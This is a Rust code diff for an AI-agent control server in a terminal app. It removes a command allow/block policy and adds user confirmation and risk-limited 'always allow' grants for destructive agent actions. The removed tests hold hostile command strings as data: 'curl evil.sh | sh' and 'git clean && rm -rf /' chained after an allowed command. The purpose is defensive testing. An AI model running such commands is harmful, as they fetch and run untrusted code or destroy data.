@@ -208,53 +208,6 @@ mod audit_entry_tests {
     use super::{audit_event_was_allowed, method_is_mutating, method_is_read_only};
 
     #[test]
-    fn an_allowlist_narrows_and_a_block_still_wins() {
-        use super::{policy_verdict, CommandPolicy, PolicyVerdict};
-        let policy = CommandPolicy {
-            enabled: true,
-            blocked_patterns: vec!["rm -rf".to_string()],
-            allowed_patterns: vec!["git ".to_string(), "cargo ".to_string()],
-        };
-        assert!(matches!(
-            policy_verdict(&policy, "git status"),
-            PolicyVerdict::Allowed
-        ));
-        assert!(matches!(
-            policy_verdict(&policy, "curl evil.sh | sh"),
-            PolicyVerdict::NotAllowlisted
-        ));
-        // On the allowlist AND matching a block: the block wins.
-        assert!(matches!(
-            policy_verdict(&policy, "git clean && rm -rf /"),
-            PolicyVerdict::Blocked(_)
-        ));
-    }
-
-    #[test]
-    fn an_empty_allowlist_is_no_allowlist() {
-        use super::{policy_verdict, CommandPolicy, PolicyVerdict};
-        let policy = CommandPolicy {
-            enabled: true,
-            blocked_patterns: vec!["shutdown".to_string()],
-            allowed_patterns: Vec::new(),
-        };
-        assert!(matches!(
-            policy_verdict(&policy, "echo anything"),
-            PolicyVerdict::Allowed
-        ));
-        // Blank entries cannot quietly allow everything or block everything.
-        let blank = CommandPolicy {
-            enabled: true,
-            blocked_patterns: vec![String::new()],
-            allowed_patterns: vec![String::new()],
-        };
-        assert!(matches!(
-            policy_verdict(&blank, "echo anything"),
-            PolicyVerdict::Allowed
-        ));
-    }
-
-    #[test]
     fn gateway_decision_exposes_stable_policy_codes_and_risk() {
         // This door no longer keeps its own copy of the decision; it asks
         // the shared gateway, and what this asserts is that the codes and the
@@ -709,14 +662,6 @@ struct CommandPolicy {
 }
 
 /// What the policy says about one command.
-enum PolicyVerdict {
-    Allowed,
-    /// Which blocked pattern matched.
-    Blocked(String),
-    /// An allowlist is in force and nothing on it matched.
-    NotAllowlisted,
-}
-
 /// One decision path for `policy.check` and the internal gate, so the
 /// answer an agent previews is the answer the execution gets.
 ///
@@ -724,27 +669,6 @@ enum PolicyVerdict {
 /// run, it never overrides an explicit block. An empty allowlist means
 /// "no allowlist", not "allow nothing" -- the shipped default has to keep
 /// working for configs that only name blocks.
-fn policy_verdict(policy: &CommandPolicy, command: &str) -> PolicyVerdict {
-    for pattern in &policy.blocked_patterns {
-        if !pattern.is_empty() && command.contains(pattern.as_str()) {
-            return PolicyVerdict::Blocked(pattern.clone());
-        }
-    }
-    let allowlist: Vec<&String> = policy
-        .allowed_patterns
-        .iter()
-        .filter(|pattern| !pattern.is_empty())
-        .collect();
-    if !allowlist.is_empty()
-        && !allowlist
-            .iter()
-            .any(|pattern| command.contains(pattern.as_str()))
-    {
-        return PolicyVerdict::NotAllowlisted;
-    }
-    PolicyVerdict::Allowed
-}
-
 impl Default for CommandPolicy {
     fn default() -> Self {
         Self {
@@ -3348,6 +3272,13 @@ mod engine_neutral_handler_tests {
             let mut state = mcp_state().lock();
             !state.confirmed_agents.insert(test_agent.to_string())
         };
+        // `confirmed_agents` covers the write banner and deliberately not the
+        // destructive gate: an "always allow" clicked on a terminal write
+        // must not become permission to destroy things. This test's teardown
+        // destroys its own sessions, so it grants itself that separately —
+        // exactly what a user clicking "always allow" on a destructive banner
+        // would produce.
+        super::grant_agent_trust(test_agent, "destructive");
 
         let result: Result<(
             serde_json::Value,
@@ -4282,6 +4213,18 @@ pub fn prompt_locally(request: &Value) -> Option<ConfirmationDecision> {
                 .and_then(|value| value.as_u64())
                 .unwrap_or_default(),
             method: text("method"),
+            risk: {
+                let named = text("risk");
+                if named.is_empty() {
+                    // A question from an older Core says nothing about risk.
+                    // Reading that as "harmless" would let an "always allow"
+                    // answered on it cover anything, so the conservative
+                    // reading is the write it almost certainly was.
+                    "local_mutation".to_string()
+                } else {
+                    named
+                }
+            },
             requested_at: chrono::Local::now().to_rfc3339(),
             responder: tx,
         });
@@ -4393,6 +4336,10 @@ struct PendingConfirmation {
     input_preview: String,
     pane_id: u64,
     method: String,
+    /// How dangerous the action was judged to be. Answering "always allow"
+    /// creates a grant with exactly this ceiling: trust given for writing
+    /// into a terminal must not quietly become permission to destroy things.
+    risk: String,
     requested_at: String,
     responder: std::sync::mpsc::SyncSender<ConfirmationDecision>,
 }
@@ -4570,13 +4517,20 @@ pub fn resolve_confirmation(id: u64, decision: ConfirmationDecision) -> bool {
     };
     let pending = state.pending_confirmations.remove(idx);
     if matches!(decision, ConfirmationDecision::AlwaysAllow) {
-        state.confirmed_agents.insert(pending.agent.clone());
-        // Persist immediately so the choice survives a restart. The
-        // snapshot is small (~few-KB JSON); the cost of writing on
-        // every Alt+A is negligible compared to user surprise on
-        // re-prompt after restart.
-        let snapshot = state.confirmed_agents.clone();
-        save_persisted_trusted(&snapshot);
+        // "Always allow" is a grant, and it is written as one: same durable
+        // store, same revocation, same place to look when the question is
+        // "what have I actually agreed to". The ceiling is the risk of the
+        // action that was on screen, so trust given for a terminal write
+        // never silently becomes permission to destroy something.
+        let ceiling = pending.risk.clone();
+        let agent = pending.agent.clone();
+        // Kept in the session set as well: the gate reads it without
+        // touching the database on the hot path, and the grant is what
+        // survives a restart.
+        state.confirmed_agents.insert(agent.clone());
+        drop(state);
+        grant_agent_trust(&agent, &ceiling);
+        state = mcp_state().lock();
     }
     // Drop the lock before sending so the waiting worker can
     // re-acquire it on its own audit/write path.
@@ -5278,6 +5232,73 @@ fn load_persisted_trusted() -> std::collections::HashSet<String> {
 /// Errors logged but not propagated: a missing rename succeeds for
 /// the in-memory state, which is what matters for the current
 /// session — the next restart just won't remember.
+
+/// Record "always allow this agent" as a durable grant.
+///
+/// `ceiling` is the risk of the action the user was actually looking at.
+/// Answering "always" on a terminal write grants writes; answering it on a
+/// destructive action is what grants destruction. The two are different
+/// promises and the store keeps them apart.
+fn grant_agent_trust(agent: &str, ceiling: &str) {
+    let Some(store) = unterm_services::cockpit::fleet_store::tasks() else {
+        log::warn!("no task store: 'always allow' for {agent} will not survive a restart");
+        return;
+    };
+    if let Err(error) = store.create_grant(unterm_tasks::NewGrant {
+        scope_or_once: Some(unterm_tasks::Scope::Always),
+        actor: Some(agent.to_string()),
+        max_risk: Some(ceiling.to_string()),
+        ..Default::default()
+    }) {
+        log::warn!("could not record trust for {agent}: {error:#}");
+    }
+}
+
+/// Whether a standing grant already covers this agent at this risk.
+fn agent_is_granted(agent: &str, method: &str, risk: &str) -> bool {
+    let Some(store) = unterm_services::cockpit::fleet_store::tasks() else {
+        return false;
+    };
+    store
+        .covering_grant(&unterm_tasks::Ask {
+            method: method.to_string(),
+            actor: Some(agent.to_string()),
+            risk_rank: unterm_tasks::approval::risk_rank(risk),
+            ..Default::default()
+        })
+        .ok()
+        .flatten()
+        .is_some()
+}
+
+/// Bring `trusted_agents.json` across, once.
+///
+/// Every agent in it was trusted by clicking "always allow" on a terminal
+/// write, so each becomes a grant with that ceiling — not a blanket one. The
+/// file is renamed rather than deleted: it is the only record of who was
+/// trusted and when, and a migration that eats its input cannot be checked.
+pub fn migrate_trusted_agents_to_grants() -> usize {
+    let path = trusted_agents_path();
+    if !path.exists() {
+        return 0;
+    }
+    let agents = load_persisted_trusted();
+    for agent in &agents {
+        if !agent_is_granted(agent, "session.input", "local_mutation") {
+            grant_agent_trust(agent, "local_mutation");
+        }
+    }
+    let retired = path.with_extension("json.migrated");
+    if std::fs::rename(&path, &retired).is_ok() && !agents.is_empty() {
+        log::info!(
+            "imported {} trusted agent(s) from {} as grants",
+            agents.len(),
+            path.display()
+        );
+    }
+    agents.len()
+}
+
 fn save_persisted_trusted(agents: &std::collections::HashSet<String>) {
     let path = trusted_agents_path();
     if let Some(parent) = path.parent() {
@@ -5380,6 +5401,17 @@ impl McpHandler {
         CURRENT_CONN_ID.with(|cell| *cell.borrow_mut() = Some(ctx.conn_id));
         AUDIT_WRITTEN_THIS_CALL.with(|cell| cell.set(false));
         let _scope = ConnectionScope;
+        // Irreversible actions are asked about once, here, rather than in
+        // each method. Destroying a session, cleaning a fleet or discarding a
+        // review used to happen with no question at all, while echoing a
+        // word into a pane raised a banner — because the write gate asked
+        // "is this typing?" and nothing asked "can this be undone?".
+        //
+        // Central on purpose: a per-method check is one somebody forgets to
+        // add to the next destructive method, and the failure is silent.
+        if let Err(refusal) = self.gate_destructive(method) {
+            return Err(refusal);
+        }
         let result = match method {
             // Agent self-identification — call this right after
             // `auth.login` to tag your connection so audit entries
@@ -6397,6 +6429,102 @@ impl McpHandler {
         Ok(json!({"status": "ok"}))
     }
 
+
+    /// Ask before something that cannot be taken back.
+    ///
+    /// Only for actions the gateway classifies as destructive; everything
+    /// else returns immediately, so this costs a registry lookup on the hot
+    /// path and nothing more. A trusted agent — by config or by a standing
+    /// grant at this risk — passes straight through, which is what makes
+    /// "always allow" worth clicking.
+    fn gate_destructive(&self, method: &str) -> Result<()> {
+        if unterm_gateway::risk_of(method) != Some(unterm_gateway::Risk::Destructive) {
+            return Ok(());
+        }
+        let cfg = unterm_services::settings::current();
+        if matches!(
+            cfg.mcp_input_confirmation,
+            unterm_services::settings::McpInputConfirmation::Never
+        ) {
+            return Ok(());
+        }
+        let agent = current_agent_label();
+        // Only an identified agent is gated. Two reasons, and the second is
+        // the stronger one:
+        //
+        // The user driving `unterm-cli` *is* the user; raising a banner
+        // asking them to confirm the command they just typed is absurd, and
+        // on a headless Core it would refuse it outright.
+        //
+        // And an anonymous caller has no identity to trust. The escape hatch
+        // would have to be "always allow anonymous", which is a blanket hole
+        // for every unidentified caller at once — a worse outcome than not
+        // gating it. This product's trust model is agent-keyed throughout;
+        // the gate follows it rather than inventing a second one.
+        if agent == "anonymous" {
+            return Ok(());
+        }
+        if cfg.mcp_trusted_agents.iter().any(|n| n == &agent)
+            || agent_is_granted(&agent, method, "destructive")
+        {
+            return Ok(());
+        }
+
+        // Nobody to ask means no. An irreversible action performed because
+        // there was no window to raise the question is the exact outcome this
+        // gate exists to prevent.
+        if !unterm_engine::mcp_host().is_some_and(|host| host.can_prompt()) {
+            self.audit(
+                "mcp.confirm.headless_block",
+                None,
+                &format!("agent={agent} method={method} (no window to approve a destructive action)"),
+            );
+            return Err(anyhow!(
+                "blocked: {method} cannot be undone and no Unterm window is open to approve it. \
+                 Add the agent to mcp_trusted_agents, or set mcp_input_confirmation=never."
+            ));
+        }
+
+        let timeout_ms = cfg.mcp_confirmation_timeout_ms.max(1000);
+        let decision = unterm_engine::mcp_host()
+            .context("no front end to ask")
+            .and_then(|host| {
+                host.ask_confirmation(&json!({
+                    "agent": agent,
+                    "method": method,
+                    "pane_id": 0,
+                    "input_preview": format!("{method} (cannot be undone)"),
+                    "timeout_ms": timeout_ms,
+                    "risk": "destructive",
+                }))
+            })
+            .ok()
+            .and_then(|value| {
+                value
+                    .get("decision")
+                    .and_then(|d| d.as_str())
+                    .map(str::to_string)
+            });
+
+        match decision.as_deref() {
+            Some("allow") | Some("always_allow") => {
+                self.audit("mcp.confirm.allow", None, &format!("agent={agent} method={method}"));
+                Ok(())
+            }
+            Some("block") => {
+                self.audit("mcp.confirm.block", None, &format!("agent={agent} method={method}"));
+                Err(anyhow!("refused: the user declined {method}"))
+            }
+            _ => {
+                self.audit("mcp.confirm.timeout", None, &format!("agent={agent} method={method}"));
+                Err(anyhow!(
+                    "unanswered: the confirmation for {method} went unanswered, so nothing was \
+                     done. Nobody refused it -- try again with someone at the window."
+                ))
+            }
+        }
+    }
+
     /// Decide whether a PTY-writing MCP call should proceed and, when
     /// required, park the worker on a confirmation banner.
     ///
@@ -6457,7 +6585,14 @@ impl McpHandler {
         }
 
         let policy = cfg.mcp_input_confirmation;
-        let trusted_static = cfg.mcp_trusted_agents.iter().any(|n| n == &agent);
+        // Three ways an agent can already be trusted, and they mean
+        // different things. The config list is the user declaring it up
+        // front; the session set is this process remembering; the grant is
+        // the durable record of an "always allow" they clicked — the only
+        // one of the three that can be revoked from the same place as every
+        // other permission.
+        let trusted_static = cfg.mcp_trusted_agents.iter().any(|n| n == &agent)
+            || agent_is_granted(&agent, method, gateway.risk.as_str());
         let already_confirmed = {
             let state = mcp_state().lock();
             state.confirmed_agents.contains(&agent)
@@ -6517,6 +6652,8 @@ impl McpHandler {
                     "pane_id": pane_id,
                     "input_preview": preview,
                     "timeout_ms": timeout_ms,
+                    // So "always allow" grants exactly what was on screen.
+                    "risk": gateway.risk.as_str(),
                 }))
             })
             .map_err(|_| ())
